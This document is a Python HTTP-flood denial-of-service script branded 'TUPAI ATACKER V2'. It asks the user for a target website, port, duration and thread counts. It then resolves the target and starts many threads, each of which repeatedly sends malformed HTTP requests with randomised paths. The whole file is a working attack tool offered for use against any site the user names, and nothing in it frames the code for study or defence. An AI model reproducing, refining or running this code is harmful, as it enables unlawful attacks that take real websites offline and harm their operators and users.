# CHECK IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . .")
    exit()

# DEF & CLASS

def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

def status_print(ip,port,thread_id,rps,path_get):
    print(f"{Fore.YELLOW}FLOODING {Fore.LIGHTYELLOW_EX}HTTP{Fore.WHITE} {Fore.WHITE}---> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data
    
def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

# DOS
def DoS_Attack(ip,host,port,type_attack,id,booter_sent,data_type_loader_packet):
    rps = 0
    url_path = ''
    path_get = ['PY_FLOOD','CHOICES_FLOOD']
    path_get_loader = random.choice((path_get))
    if path_get_loader == "PY_FLOOD":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        elif data_type_loader_packet == 'OWN1':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
        elif data_type_loader_packet == 'OWN2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
        elif data_type_loader_packet == 'OWN3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
        elif data_type_loader_packet == 'OWN4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
        elif data_type_loader_packet == 'OWN5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
        s.connect((ip,port))
        for _ in range(booter_sent):
            s.sendall(packet_data)
            s.send(packet_data)
            rps += 2
    except:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass
    status_print(ip,port,id,rps,path_get_loader)

status_code = False
id_loader = 0
def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
    global status_code,id_loader
    if status_code == True:
        while time.time() < time_loader:
            for _ in range(spam_loader):
                id_loader += 1
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                th.start()
    else:
        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()

#DATA
os.system('clear')
banner = f"""\n
{Fore.YELLOW}      (●) (●)
{Fore.YELLOW} [ {Fore.RED}TUPAI ATACKER V2 {Fore.YELLOW}]
{Fore.WHITE}Author : Mr./B7
{Fore.WHITE}Github : https://github.com/Unlimitid-Crak-You

{Fore.RED}┏┳┓ ┳ ┳ ┏━┓ ┏━┓ ┳   ┏━┓ ┏┳┓ ┏┳┓ ┏━┓ ┏━┓ ┳┏━  
{Fore.LIGHTRED_EX} ┃  ┃ ┃ ┣━┛ ┣━┫ ┃   ┣━┫  ┃   ┃  ┣━┫ ┃   ┣┻┓ 
{Fore.WHITE} ┻  ┗━┛ ┻   ┻ ┻ ┻   ┻ ┻  ┻   ┻  ┻ ┻ ┗━┛ ┻ ┻  {Fore.YELLOW}(PMC) {Fore.LIGHTYELLOW_EX}TPA V2{Fore.RESET}\n"""

print(banner)
host = ""
ip = ""
print(f"{Fore.LIGHTWHITE_EX}[ PYF OWN1-5 ]")
data_type_loader_packet = input(F"{Fore.WHITE}TYPE PACKET {Fore.YELLOW}({Fore.WHITE}DEFAULT : PYF EXAMPLE : OWN1{Fore.YELLOW}) \033[36m>> ").upper()
target_loader = input(f"{Fore.LIGHTYELLOW_EX}\n\033[31m[ \033[37mWARNING \033[31m] \033[32mMASUKAN DOMAIN WEBSITE TARGET KALIAN !!\n• \033[33mINPUT \033[37m>> \033[36mIP/URL : \033[33m")
port_loader = int(input(f"{Fore.YELLOW}• \033[33mINPUT \033[37m>> \033[36mPORT   : \033[33m"))
time_loader = time.time() + int(input(f"{Fore.LIGHTRED_EX}• \033[33mINPUT \033[37m>> \033[36mTIME ( DEFAULT=250 ) : \033[33m"))
spam_loader = int(input(f"{Fore.RED}• \033[33mINPUT \033[37m>> \033[36mSPAM THREAD ( DEFAULT=50 OR 299 ) : \033[33m"))
create_thread = int(input(F"{Fore.LIGHTGREEN_EX}• \033[33mINPUT \033[37m>> \033[36mCREATE THREAD ( DEFAULT=50 ) : \033[33m"))
booter_sent = int(input(F"{Fore.GREEN}• \033[33mINPUT \033[37m>> \033[36mBOOTER SENT (DEFAULT=500 EXAMPLE=65536) : \033[33m"))
print(f"{Fore.LIGHTCYAN_EX}\n\033[31m[ \033[37mWARNING \033[31m]\nEXAMPLE HTTP METHODS> CONNECT GET PUT PATCH POST HEAD DELETE OPTIONS TRACE")
print(f"{Fore.CYAN}\n[ EXAMPLE CUSTOM HTTP METHODS ]\nPANOS MIRAI EXPLOIT LOGSHELL SERVER CLOUDFLARE AGE PYFLOODER GATEWAY")
methods_loader = input(F"{Fore.LIGHTBLUE_EX}\n• \033[33mINPUT \033[37m>> \033[36mHTTP_METHODS (EXAMPLE=GATEWAY) : \033[33m").upper()
spam_create_thread = int(input(F"{Fore.LIGHTBLACK_EX}• \033[33mINPUT \033[37m>> \033[36mSPAM CREATE THREAD (DEFAULT=5 EXAMPLE=15) \033[33m"))
print(f"{Fore.MAGENTA}\nTRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
try:
    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    exit()
for loader_num in range(create_thread):
    sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} RUNNING CREATE THREAD . . .{Fore.RESET}")
    sys.stdout.flush()
    
    for _ in range(spam_create_thread):
        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
clear_text()
print(banner)
status_code = True
print(f"{Fore.GREEN}TRYING SENT . . .{Fore.RESET}")
